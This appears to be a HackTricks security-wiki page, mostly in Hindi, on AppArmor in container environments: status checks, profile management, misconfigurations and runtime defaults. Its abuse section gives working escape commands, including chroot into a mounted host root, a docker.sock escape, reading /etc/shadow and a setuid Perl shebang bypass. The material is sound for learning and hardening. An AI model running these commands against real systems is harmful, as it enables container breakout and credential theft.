# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

AppArmor एक **Mandatory Access Control** सिस्टम है जो प्रति-प्रोग्राम प्रोफाइल के माध्यम से प्रतिबंध लागू करता है। पारंपरिक DAC चेक्स के विपरीत, जो उपयोगकर्ता और समूह के ownership पर बहुत निर्भर करते हैं, AppArmor कर्नेल को उस प्रक्रिया से जुड़ी नीति लागू करने देता है। कंटेनर वातावरण में यह महत्वपूर्ण है क्योंकि किसी वर्कलोड के पास पारंपरिक रूप से किसी कार्रवाई का प्रयास करने के लिए पर्याप्त विशेषाधिकार हो सकते हैं, फिर भी उसे अस्वीकार किया जा सकता है क्योंकि उसका AppArmor प्रोफ़ाइल संबंधित path, mount, नेटवर्क व्यवहार या capability के उपयोग की अनुमति नहीं देता।

सबसे महत्वपूर्ण विचारशील बिंदु यह है कि AppArmor **path-based** है। यह SELinux की तरह लेबल्स के बजाय path नियमों के माध्यम से फाइलसिस्टम एक्सेस का निर्णय करता है। इससे यह उपयोग में आसान और शक्तिशाली बनता है, पर इसका मतलब यह भी है कि bind mounts और वैकल्पिक path लेआउट्स पर सावधानी से ध्यान देना चाहिए। यदि वही host सामग्री किसी अलग path के तहत पहुंच योग्य हो जाती है, तो नीति का प्रभाव ऑपरेटर की पहली उम्मीद के अनुरूप नहीं हो सकता।

## कंटेनर अलगाव में भूमिका

Container सुरक्षा समीक्षाएँ अक्सर capabilities और seccomp पर ही रुक जाती हैं, पर AppArmor उन चेक्स के बाद भी मायने रखता है। कल्पना करें कि किसी container के पास जितना privilege होना चाहिए उससे अधिक है, या किसी वर्कलोड को संचालनिक कारणों से एक अतिरिक्त capability की आवश्यकता थी। AppArmor तब भी फाइल एक्सेस, mount व्यवहार, नेटवर्किंग और execution पैटर्न्स को सीमित कर सकता है ताकि स्पष्ट दुरुपयोग पथ रोका जा सके। इसलिए AppArmor को "बस application को चलाने के लिए" डिसेबल करना धीरे-धीरे एक मात्र जोखिम भरे कॉन्फ़िगरेशन को सक्रिय रूप से exploitable स्थिति में बदल सकता है।

## लैब

होस्ट पर AppArmor सक्रिय है या नहीं, जांचने के लिए उपयोग करें:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
यह देखने के लिए कि वर्तमान container process किसके तहत चल रही है:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
यह अंतर शिक्षाप्रद है। सामान्य मामले में, प्रक्रिया को उस AppArmor context को दिखाना चाहिए जो runtime द्वारा चुने गए profile से जुड़ा होता है। unconfined मामले में, वह अतिरिक्त restriction layer गायब हो जाता है।

आप यह भी जाँच कर सकते हैं कि Docker ने क्या लागू किया था:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## रनटाइम उपयोग

Docker होस्ट द्वारा सपोर्ट किए जाने पर एक डिफ़ॉल्ट या कस्टम AppArmor प्रोफ़ाइल लागू कर सकता है। AppArmor-आधारित सिस्टमों पर Podman भी AppArmor के साथ इंटीग्रेट हो सकता है, हालांकि SELinux-प्राथमिक वितरणों पर दूसरा MAC सिस्टम अक्सर प्रमुख भूमिका निभाता है। Kubernetes उन नोड्स पर जहाँ वास्तव में AppArmor समर्थित है, वर्कलोड स्तर पर AppArmor पॉलिसी एक्सपोज़ कर सकता है। LXC और संबंधित Ubuntu-family सिस्टम-कंटेनर वातावरण भी व्यापक रूप से AppArmor का उपयोग करते हैं।

प्रायोगिक बात यह है कि AppArmor कोई "Docker feature" नहीं है। यह एक host-kernel फीचर है जिसे कई runtimes लागू कर सकते हैं। अगर होस्ट इसे सपोर्ट नहीं करता या runtime को unconfined चलने के लिए कहा जाता है, तो कथित सुरक्षा वास्तव में मौजूद नहीं रहती।

Docker-कैपेबल AppArmor होस्ट्स पर, सबसे प्रसिद्ध डिफॉल्ट `docker-default` है। यह प्रोफ़ाइल Moby के AppArmor टेम्पलेट से जनरेट होती है और महत्वपूर्ण है क्योंकि यह समझाती है कि कुछ capability-based PoCs डिफ़ॉल्ट कंटेनर में अभी भी क्यों फेल होते हैं। साधारण शब्दों में, `docker-default` सामान्य नेटवर्किंग की अनुमति देता है, `/proc` के बड़े हिस्सों पर लिखने की अनुमति नहीं देता, `/sys` के संवेदनशील हिस्सों तक पहुंच रोकता है, माउंट ऑपरेशंस को ब्लॉक करता है, और ptrace को सीमित करता है ताकि यह एक सामान्य host-probing primitive न बन जाए। उस बेसलाइन को समझने से यह अलग करना आसान होता है कि 'कंटेनर के पास `CAP_SYS_ADMIN` है' और 'कंटेनर वास्तव में उस capability का उपयोग उन kernel interfaces के खिलाफ कर सकता है जिनकी मुझे परवाह है' में क्या अंतर है।

## प्रोफ़ाइल प्रबंधन

AppArmor प्रोफ़ाइल आमतौर पर `/etc/apparmor.d/` के अंतर्गत संग्रहीत रहती हैं। एक सामान्य नामकरण कन्वेंशन यह है कि executable path में slashes को dots से बदल दिया जाता है। उदाहरण के लिए, `/usr/bin/man` के लिए प्रोफ़ाइल आमतौर पर `/etc/apparmor.d/usr.bin.man` के रूप में स्टोर होती है। यह विवरण रक्षा और आकलन दोनों के दौरान महत्वपूर्ण होता है क्योंकि एक बार जब आप सक्रिय प्रोफ़ाइल नाम जान लेते हैं, तो आप अक्सर संबंधित फ़ाइल को होस्ट पर जल्दी से पा सकते हैं।

उपयोगी होस्ट-साइड मैनेजमेंट कमांड्स में शामिल हैं:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
ये कमांड्स container-security संदर्भ में इसलिए महत्वपूर्ण हैं कि वे बताते हैं कि प्रोफ़ाइल वास्तव में कैसे बनाए जाते हैं, लोड किए जाते हैं, complain mode में स्विच किए जाते हैं, और एप्लिकेशन में बदलाव के बाद कैसे संशोधित किए जाते हैं। अगर कोई ऑपरेटर troubleshooting के दौरान प्रोफ़ाइल्स को complain mode में डालने की आदत रखता है और enforcement को बहाल करना भूल जाता है, तो डॉक्यूमेंटेशन में container सुरक्षित दिख सकता है जबकि वास्तविकता में वह बहुत अधिक ढीला व्यवहार कर रहा होता है।

### प्रोफ़ाइल बनाना और अपडेट करना

`aa-genprof` एप्लिकेशन के व्यवहार का अवलोकन कर सकता है और इंटरैक्टिव रूप से एक प्रोफ़ाइल जनरेट करने में मदद कर सकता है:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` एक टेम्पलेट प्रोफ़ाइल जेनरेट कर सकता है जिसे बाद में `apparmor_parser` के साथ लोड किया जा सकता है:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
जब बाइनरी बदलता है और नीति को अपडेट करने की आवश्यकता होती है, `aa-logprof` logs में पाए गए denials को replay कर सकता है और ऑपरेटर को यह तय करने में मदद कर सकता है कि उन्हें allow करना है या deny करना है:
```bash
sudo aa-logprof
```
### लॉग

AppArmor द्वारा इनकार की गई प्रविष्टियाँ अक्सर `auditd`, syslog, या `aa-notify` जैसे टूल्स के माध्यम से दिखाई देती हैं:
```bash
sudo aa-notify -s 1 -v
```
### सटीक Profile फ़ाइल की पहचान

यह संचालनात्मक और आक्रामक दोनों रूप से उपयोगी है। रक्षक इसे प्रोफ़ाइलों को परिष्कृत करने के लिए उपयोग करते हैं। हमलावर इसका उपयोग यह जानने के लिए करते हैं कि किस सटीक path या operation को रोका जा रहा है और क्या AppArmor exploit chain को ब्लॉक कर रहा है।

जब कोई runtime किसी container के लिए एक विशिष्ट AppArmor profile नाम दिखाता है, तो अक्सर उस नाम को डिस्क पर मौजूद profile फ़ाइल से मैप करना उपयोगी होता है:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
This is especially useful during host-side review because it bridges the gap between "the container says it is running under profile `lowpriv`" and "the actual rules live in this specific file that can be audited or reloaded".

## गलत कॉन्फ़िगरेशन

The most obvious mistake is `apparmor=unconfined`. Administrators often set it while debugging an application that failed because the profile correctly blocked something dangerous or unexpected. If the flag remains in production, the entire MAC layer has effectively been removed.

Another subtle problem is assuming that bind mounts are harmless because the file permissions look normal. Since AppArmor is path-based, exposing host paths under alternate mount locations can interact badly with path rules. A third mistake is forgetting that a profile name in a config file means very little if the host kernel is not actually enforcing AppArmor.

## दुरुपयोग

When AppArmor is gone, operations that were previously constrained may suddenly work: reading sensitive paths through bind mounts, accessing parts of procfs or sysfs that should have remained harder to use, performing mount-related actions if capabilities/seccomp also permit them, or using paths that a profile would normally deny. AppArmor is often the mechanism that explains why a capability-based breakout attempt "should work" on paper but still fails in practice. Remove AppArmor, and the same attempt may start succeeding.

If you suspect AppArmor is the main thing stopping a path-traversal, bind-mount, or mount-based abuse chain, the first step is usually to compare what becomes accessible with and without a profile. For example, if a host path is mounted inside the container, start by checking whether you can traverse and read it:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
यदि container में `CAP_SYS_ADMIN` जैसी कोई खतरनाक capability भी मौजूद है, तो सबसे व्यावहारिक परीक्षणों में से एक यह है कि क्या AppArmor mount operations या संवेदनशील kernel filesystems तक पहुँच को ब्लॉक कर रहा है:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
ऐसे वातावरणों में जहाँ host path पहले से ही bind mount के माध्यम से उपलब्ध है, AppArmor खो जाने से read-only information-disclosure समस्या सीधे host file access में बदल सकती है:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
इन कमांड्स का उद्देश्य यह नहीं है कि केवल AppArmor ही breakout बनाता है। इसका मतलब यह है कि एक बार AppArmor हट जाने पर, कई filesystem और mount-based abuse paths तुरंत परीक्षण के लिए उपलब्ध हो जाते हैं।

### पूर्ण उदाहरण: AppArmor Disabled + Host Root Mounted

यदि container में पहले से host root bind-mounted है `/host`, तो AppArmor को हटाने से एक blocked filesystem abuse path पूरी तरह complete host escape में बदल सकता है:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
एक बार जब shell host filesystem के माध्यम से चल रहा होता है, तो workload प्रभावी रूप से container boundary से बाहर निकल चुका होता है:
```bash
id
hostname
cat /etc/shadow | head
```
### पूरा उदाहरण: AppArmor निष्क्रिय + Runtime Socket

यदि वास्तविक बाधा रनटाइम स्थिति के चारों ओर AppArmor था, तो एक mounted socket पूरी तरह से escape के लिए पर्याप्त हो सकता है:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
सटीक पथ माउंट पॉइंट पर निर्भर करता है, लेकिन परिणाम वही है: AppArmor अब runtime API तक पहुँचने को रोक नहीं रहा है, और runtime API एक host-compromising container लॉन्च कर सकता है।

### पूर्ण उदाहरण: Path-Based Bind-Mount Bypass

क्योंकि AppArmor पथ-आधारित है, `/proc/**` की सुरक्षा स्वचालित रूप से उसी host procfs सामग्री की सुरक्षा नहीं करती जब वह किसी अन्य पथ से पहुँच योग्य हो:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
प्रभाव इस बात पर निर्भर करता है कि ठीक-ठीक क्या mounted है और क्या alternate path अन्य controls को भी bypass करता है या नहीं, लेकिन यह पैटर्न उन सबसे स्पष्ट कारणों में से एक है कि AppArmor को अलग से नहीं बल्कि mount layout के साथ मिलाकर मूल्यांकन किया जाना चाहिए।

### Full Example: Shebang Bypass

AppArmor policy कभी-कभी किसी interpreter path को इस तरह target करती है कि वह shebang handling के माध्यम से होने वाले script execution को पूरी तरह ध्यान में नहीं रखती। एक ऐतिहासिक उदाहरण में एक script का उपयोग शामिल था जिसकी पहली पंक्ति एक confined interpreter की ओर इशारा करती थी:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
इस तरह का उदाहरण यह याद दिलाने के लिए महत्वपूर्ण है कि प्रोफ़ाइल का इरादा और वास्तविक निष्पादन व्यवहार अलग हो सकते हैं। जब container environments में AppArmor की समीक्षा कर रहे हों, तो interpreter chains और alternate execution paths पर विशेष ध्यान दिया जाना चाहिए।

## जांच

इन जांचों का उद्देश्य तीन प्रश्नों का त्वरित उत्तर देना है: क्या AppArmor host पर enabled है, क्या current process confined है, और क्या runtime ने वास्तव में इस container पर कोई profile apply किया है?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- यदि `/proc/self/attr/current` में `unconfined` दिखता है, तो workload AppArmor confinement का लाभ नहीं उठा रहा है।
- यदि `aa-status` AppArmor को disabled या not loaded दिखाता है, तो runtime config में कोई भी profile नाम ज्यादातर केवल सजावटी होता है।
- यदि `docker inspect` में `unconfined` या कोई अनपेक्षित custom profile दिखता है, तो अक्सर यही कारण होता है कि filesystem या mount-based abuse path काम कर जाता है।

यदि किसी container के पास operational कारणों से पहले से ही elevated privileges हैं, तो AppArmor को enabled रहने देने से अक्सर नियंत्रित अपवाद और कहीं अधिक व्यापक सुरक्षा विफलता के बीच का फर्क पड़ता है।

## Runtime Defaults

| Runtime / platform | डिफ़ॉल्ट स्थिति | डिफ़ॉल्ट व्यवहार | सामान्य मैन्युअल कमजोरियाँ |
| --- | --- | --- | --- |
| Docker Engine | AppArmor-सक्षम होस्ट्स पर डिफ़ॉल्ट रूप से सक्षम | यदि ओवरराइड न किया गया हो तो `docker-default` AppArmor profile का उपयोग करता है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | होस्ट-निर्भर | AppArmor को `--security-opt` के माध्यम से सपोर्ट किया जाता है, लेकिन सटीक डिफ़ॉल्ट होस्ट/runtime पर निर्भर है और Docker के दस्तावेजीकृत `docker-default` profile जितना सार्वभौमिक नहीं है | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | सशर्त डिफ़ॉल्ट | यदि `appArmorProfile.type` निर्दिष्ट नहीं है तो डिफ़ॉल्ट `RuntimeDefault` है, लेकिन यह केवल उस समय लागू होता है जब node पर AppArmor enabled हो | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | node/runtime सपोर्ट के अनुसार | सामान्य Kubernetes-सपोर्टेड runtimes AppArmor को सपोर्ट करते हैं, लेकिन वास्तविक प्रवर्तन अभी भी node सपोर्ट और workload सेटिंग्स पर निर्भर करता है | Kubernetes row जैसा ही; direct runtime configuration भी AppArmor को पूरी तरह स्किप कर सकती है |

AppArmor के लिए सबसे महत्वपूर्ण चर अक्सर **होस्ट** होता है, न कि केवल रनटाइम। manifest में profile setting उस node पर confinement नहीं बनाती जहाँ AppArmor सक्षम नहीं है।
